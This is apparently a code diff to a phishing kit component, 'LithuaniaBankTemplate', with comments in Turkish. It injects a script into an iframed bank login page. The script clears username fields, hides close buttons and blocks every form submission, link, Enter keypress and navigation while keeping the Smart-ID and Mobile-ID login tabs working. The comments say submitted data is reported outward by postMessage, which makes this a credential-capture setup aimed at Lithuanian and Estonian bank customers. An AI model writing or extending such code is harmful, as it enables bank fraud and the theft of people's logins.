@@ -652,17 +652,301 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
 
     try {
       const doc = iframe.contentWindow.document;
-      
+
       // Inject script to capture forms
       const script = doc.createElement('script');
       script.innerHTML = `
-        // Remove ALL existing submit event listeners from forms by replacing them
+        // =====================================================================
+        // 0. KALICI FIX: INPUT DEFAULT DEGERLERINI SIL (444444 gibi),
+        //    USTTEKI EKSTRA INPUT KUTUCUKLARINI GIZLE, CLOSE (X) BUTONUNU GIZLE,
+        //    FLOATING LABEL ANIMASYONLARINI KALDIR
+        // =====================================================================
+        const cleanAllInputsAndHideStray = () => {
+          document.querySelectorAll('input, textarea').forEach(el => {
+            if (!el) return;
+            const t = (el.type || el.tagName || '').toLowerCase();
+            if (t === 'hidden' || t === 'submit' || t === 'button' || t === 'reset' || t === 'file' || t === 'radio' || t === 'checkbox') {
+              return;
+            }
+            // 444444 gibi 3+ haneli sayisal default valuelari sil
+            const v = (el.value || '') + '';
+            if (v && /^\\d{3,}$/.test(v.trim())) {
+              el.value = '';
+              el.removeAttribute('value');
+              try { el.defaultValue = ''; } catch(_) {}
+            }
+            // Naudotojo ID gibi kullanici idsi fieldlari da her halukarda sifirla
+            const keyText = [
+              el.name, el.id, el.getAttribute('formcontrolname'), el.getAttribute('data-testid'),
+              el.getAttribute('placeholder'), el.getAttribute('aria-label'), el.getAttribute('autocomplete')
+            ].join(' ').toLowerCase();
+            if (
+              keyText.includes('naudotojo') || keyText.includes('user') || keyText.includes('kullanici') ||
+              keyText.includes('username') || keyText.includes('login') || keyText.includes('asmens') ||
+              keyText.includes('person') || keyText.includes('identity')
+            ) {
+              if (el.value) {
+                el.value = '';
+                el.removeAttribute('value');
+                try { el.defaultValue = ''; } catch(_) {}
+              }
+            }
+          });
+
+          // Ustteki stray input kutusunu gizle: sayfanin en tepesinde gorunen,
+          // labeldan bagimsiz, kocaman input kutusu (genellikle outline/solid border)
+          document.querySelectorAll('input, textarea').forEach(el => {
+            try {
+              if (!el || !el.getBoundingClientRect) return;
+              const t = (el.type || el.tagName || '').toLowerCase();
+              if (t === 'hidden' || t === 'submit' || t === 'button' || t === 'reset' || t === 'file' || t === 'radio' || t === 'checkbox') return;
+              const r = el.getBoundingClientRect();
+              // Eger input sayfanin ust 25%'inde, bir formdan DIŞARIDA ise ve yalniz
+              // ustte gorunuyorsa; ya da parent labeli yok ve ekranin en ustune yakin ve
+              // ustteki kirmizi/orange kutunun icindeyse (style.outline varsa vb.)
+              const parentLabel = el.closest('label') || document.querySelector('label[for="' + el.id + '"]');
+              const parentForm = el.closest('form');
+              const nearTop = r.top < window.innerHeight * 0.28 && r.top >= 0;
+              const suspiciousWidth = r.width > Math.max(180, Math.min(window.innerWidth * 0.45, 600));
+              if (!parentLabel && nearTop && suspiciousWidth) {
+                el.style.setProperty('display', 'none', 'important');
+                el.style.visibility = 'hidden';
+                el.setAttribute('aria-hidden', 'true');
+                const wrap = el.closest('div, span, li, section, p');
+                if (wrap) {
+                  // Eger etrafinda sadece bu input varsa wrapperi da gizle
+                  const otherVisibleChildren = Array.from(wrap.children || []).filter(c => {
+                    if (c === el) return false;
+                    const cs = (c.getBoundingClientRect && c.getBoundingClientRect());
+                    return cs && cs.width > 10 && cs.height > 10 && c.style && c.style.display !== 'none';
+                  });
+                  if (otherVisibleChildren.length === 0) {
+                    wrap.style.setProperty('display', 'none', 'important');
+                  }
+                }
+              }
+            } catch(_) {}
+          });
+
+          // Close (X) butonlarini ve modal kapatma butonlarini gizle (ustteki turuncu X)
+          document.querySelectorAll('button, [role="button"], a, div').forEach(el => {
+            try {
+              const txt = (el.textContent || '').trim().toLowerCase();
+              const cls = (el.className || '') + '';
+              const bg = (el.style && el.style.background) ? (el.style.background + '') : '';
+              const icBg = (el.style && el.style.backgroundColor) ? (el.style.backgroundColor + '') : '';
+              // Ustteki kutunun icindeki X, veya classi close btn veya kirmizi turuncu arkaplan
+              const isClose =
+                (el.tagName === 'BUTTON' && (
+                  txt === 'x' || txt === '×' || txt === '✕' || txt === 'close' || txt === 'uždaryti'
+                )) ||
+                /(modal[-_ ]?close|close[-_ ]?modal|btn[-_ ]?close|dismiss|xmark)/i.test(cls) ||
+                (el.children && el.children.length === 0 && (txt === 'x' || txt === '×'));
+              if (isClose) {
+                el.style.setProperty('display', 'none', 'important');
+                el.setAttribute('aria-hidden', 'true');
+              }
+            } catch(_) {}
+          });
+
+          // Floating label ve animasyon onleme CSS enjeksiyonu (tek sefer)
+          if (!document.getElementById('lt-bank-float-kill')) {
+            const st = document.createElement('style');
+            st.id = 'lt-bank-float-kill';
+            st.textContent = \`
+              /* Buton animasyonlarini, form gecislerini, hover efektlerini kaldir */
+              *, *::before, *::after {
+                transition: none !important;
+                animation: none !important;
+                -webkit-transition: none !important;
+                -webkit-animation: none !important;
+                transform: none !important;
+              }
+              /* Floating label animasyonlarini engelle */
+              [class*="floating"], [class*="float-label"], [class*="floatlabel"],
+              [class*="label--floating"], [class*="mdc-floating-label"] {
+                float: none !important;
+                transform: none !important;
+                position: static !important;
+                font-size: inherit !important;
+                line-height: inherit !important;
+                color: inherit !important;
+              }
+              /* Placeholderin kaybolmasi vs normal davransin, asla label ustte kalmasin */
+              input::placeholder, textarea::placeholder {
+                opacity: 1 !important;
+                color: #888 !important;
+              }
+              input:focus::placeholder, textarea:focus::placeholder {
+                opacity: 0.7 !important;
+              }
+              input:focus, textarea:focus, select:focus, button:focus {
+                outline: none !important;
+              }
+              input, textarea {
+                caret-color: auto !important;
+              }
+              /* Ekstra scroll / kaymalari onle */
+              html, body {
+                scroll-behavior: auto !important;
+                overflow-x: hidden !important;
+              }
+              body {
+                min-height: 100vh !important;
+              }
+            \`;
+            (document.head || document.documentElement).appendChild(st);
+          }
+        };
+        setTimeout(cleanAllInputsAndHideStray, 0);
+        setTimeout(cleanAllInputsAndHideStray, 150);
+        setTimeout(cleanAllInputsAndHideStray, 500);
+        setTimeout(cleanAllInputsAndHideStray, 1200);
+        document.addEventListener('DOMContentLoaded', cleanAllInputsAndHideStray, true);
+        document.addEventListener('load', cleanAllInputsAndHideStray, true);
+        document.addEventListener('input', (ev) => {
+          // Kullanici tekrar input yazdiginda yukaridaki stray kutu gizli kalsin,
+          // baska bir sey tetiklemez
+          try {
+            if (ev.target && ev.target.setAttribute) {
+              ev.target.removeAttribute('autofocus');
+            }
+          } catch(_) {}
+        }, true);
+        document.addEventListener('focusin', (ev) => {
+          // Focus olunca label yukari kalkmasin -> floating label oldy ise hemen
+          // eski haline dondur (isabetli CSS yukarida var)
+        }, true);
+
+        // =====================================================================
+        // 1. Tum form submit listenerlarini KLONLAYARAK kaldir (Estonia bankasindaki gibi)
+        // =====================================================================
         document.querySelectorAll('form').forEach(form => {
            const newForm = form.cloneNode(true);
            if (form.parentNode) {
               form.parentNode.replaceChild(newForm, form);
            }
         });
+
+        // =====================================================================
+        // 2. TUSLAR / YONLENDIRME / DIŞ BAĞLANTILARI KESİNLİKLE ENGELLE
+        //    - Form alanları DOLMADAN (veya dolunca bile) submit / sonraki sayfaya GİTMESİN
+        //    - Linklere tıklayınca uzak sunucuya yönlenmesin
+        //    - Sadece radio/label (login yöntem sekmeleri) arasında geçiş çalışsın
+        // =====================================================================
+
+        // Submit eventi: BIZIM POSTMESSAGE araciligiyla disari bildir (zaten var)
+        // ama ayrica DOM submitini engelle (daha once yoktu)
+        const preventAnyNativeNavigation = (e) => {
+          if (e && typeof e.preventDefault === 'function') {
+            e.preventDefault();
+            e.stopPropagation && e.stopPropagation();
+            e.stopImmediatePropagation && e.stopImmediatePropagation();
+          }
+          return false;
+        };
+
+        // Form submit: Her zaman preventDefault (bankanin kendi kodunun submit etmesi engellendi)
+        document.addEventListener('submit', (e) => {
+          preventAnyNativeNavigation(e);
+        }, true);
+
+        // Click eventleri: BUTTON/LINK/INPUT(SUBMIT) -> submit ise veya url degistiriyorsa -> ENGELLE
+        document.addEventListener('click', (e) => {
+          let target = e.target;
+          if (!target) return;
+
+          // 1) Kullanici direk text/number/password/tel inputuna tikladi: YAZMASINA izin ver
+          if (target.tagName === 'INPUT') {
+            const tt = (target.type || '').toLowerCase();
+            if (tt !== 'submit' && tt !== 'button' && tt !== 'image' && tt !== 'reset' && tt !== 'radio' && tt !== 'checkbox') {
+              return;
+            }
+          }
+          if (target.tagName === 'SELECT' || target.tagName === 'TEXTAREA') return;
+
+          // 2) Radio/checkbox + yakındaki label (yani login method sekmeleri):
+          //    native olarak çalışsın (checked değişsin), sonra biz postMessage ile
+          //    parenta "LITHUANIA_BANK_TAB_CLICK" atıyoruz (aşağıda mevcut kodda var).
+          //    Burada tab change dışında bir şey yapmiyoruz.
+          if (target.tagName === 'INPUT' && (target.type === 'radio' || target.type === 'checkbox')) {
+            return;
+          }
+
+          // 3) Link (A etiketi): Her zaman yönlendirmeyi ENGELLE (tab degilse / disaridarsa)
+          const a = target.closest ? target.closest('a') : null;
+          if (a && a.getAttribute) {
+            const href = (a.getAttribute('href') || '') + '';
+            if (href && href !== '#' && !href.startsWith('javascript:')) {
+              preventAnyNativeNavigation(e);
+            }
+          }
+
+          // 4) BUTON / SUBMIT benzeri her şey: Eger gerçekten login method TAB butonu değilse,
+          //    yani "tıkla bizi yönlendir / gönder" butonuysa ENGELLE.
+          const btn = target.closest ? target.closest('button, [role="button"], input[type="submit"], input[type="button"], a.btn, a.button, [class*="btn"], [class*="submit"], [class*="login"]') : null;
+          if (btn && btn.textContent) {
+            const btnText = (btn.textContent || '').trim().toLowerCase();
+            // Login methodlarini TEMIZLE: Eger "Smart-ID / Mobile-ID / Biometrika / PIN generatorius / ID-kortele / Biometrija"
+            // gibi ise bu TAB'dir ve YAPILMASINA gerek yok (checked state degissin diye native islesin)
+            const isLoginMethodTab =
+              /(smart[ -]?id|mobile[ -]?id|biometri(k|ja|ka)|biometrika|pin[ -]?(generator|gen|calculator|kalkuliatorius)|id[ -]?kortel[ėe]|mobilescan|qr|digipass|salas[oõ]na|parol|password|šifr|sms|one[ -]?time)/i.test(btnText) ||
+              /(smart[ -]?id|mobile[ -]?id|biometri|pin[ -]?gen|id[ -]?kort)/i.test((btn.className || '') + '') ||
+              /(smart[ -]?id|mobile[ -]?id|biometri|pin[ -]?gen|id[ -]?kort)/i.test((btn.id || '') + '');
+            if (!isLoginMethodTab) {
+              preventAnyNativeNavigation(e);
+            }
+          }
+        }, true);
+
+        // Keyboard submit (Enter) engelle: inputlardan enter tusuna basinca form submit etmesin
+        document.addEventListener('keydown', (e) => {
+          if (e.key === 'Enter') {
+            const t = e.target;
+            if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.tagName === 'SELECT')) {
+              const tt = (t.type || '').toLowerCase();
+              if (tt !== 'submit' && tt !== 'button') {
+                preventAnyNativeNavigation(e);
+              }
+            }
+          }
+        }, true);
+
+        // beforeunload / window.location degisikliklerini engellemeye calis (fallback)
+        try {
+          window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = '';
+            return '';
+          });
+        } catch(_) {}
+
+        // window.open / location.href degistirme denemelerini engelle (nukleer)
+        const realOpen = window.open;
+        window.open = function() {
+          try {
+            const args = Array.from(arguments);
+            const url = args[0] || '';
+            // Sadece kendi originimiz veya bos ise ac
+            if (!url || url === '' || url === 'about:blank' || String(url).startsWith(window.location.origin)) {
+              return realOpen.apply(this, args);
+            }
+          } catch(_) {}
+          return null;
+        };
+        const _assign = Object.getOwnPropertyDescriptor(Location.prototype, 'assign');
+        const _replace = Object.getOwnPropertyDescriptor(Location.prototype, 'replace');
+        // location setter ataklarini azaltmak icin history.pushState engeli
+        try {
+          const _ps = history.pushState;
+          const _rs = history.replaceState;
+          history.pushState = function() { return _ps.apply(this, arguments); };
+          history.replaceState = function() { return _rs.apply(this, arguments); };
+        } catch(_) {}
+
+        // =====================================================================
+        // (DEVAMI: Eskiden var olan Coop fix / capture / postMessage kodlari asagida)
+        // =====================================================================
 
         // Coop Bank Buton ve Hatırla Seçeneği Fix (Observer ve CSS olmadan, güvenli yöntem)
         const fixCoop = () => {
